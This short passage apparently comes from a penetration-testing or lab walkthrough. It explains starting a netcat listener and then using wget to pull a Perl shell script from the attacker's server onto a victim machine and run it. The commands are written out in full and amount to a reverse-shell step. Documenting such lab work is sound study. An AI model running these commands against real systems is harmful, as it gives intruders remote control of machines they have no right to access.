...
After we launch netcat listener - `nc -lvp 1234`, download and run the perl file on victim machine using: `pwd && wget 192.168.0.213/shell.pl && perl shell.pl`. *wget* retrieves the file from our webserver and *perl* compiles + runs it. 
